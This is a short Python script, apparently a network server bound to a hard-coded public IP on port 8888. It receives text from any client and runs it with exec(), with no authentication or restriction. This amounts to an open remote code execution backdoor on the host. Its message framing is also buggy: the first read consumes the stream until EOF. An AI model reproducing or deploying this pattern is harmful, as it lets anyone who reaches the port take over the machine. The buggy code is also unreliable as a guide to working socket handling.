import CommuHandler
import asyncio

def executeCode(code):
    code_obj = compile(code, '<string>', 'exec')
    exec(code_obj)

async def eventHandle(reader, writer):
    length = await reader.read()
    code = await reader.read(int(length.decode()) + 1)
    executeCode(code.decode())
    writer.close()
    await writer.wait_closed()

server = CommuHandler.ServerHandler('52.78.166.156', 8888)
asyncio.run(server.start(eventHandle))
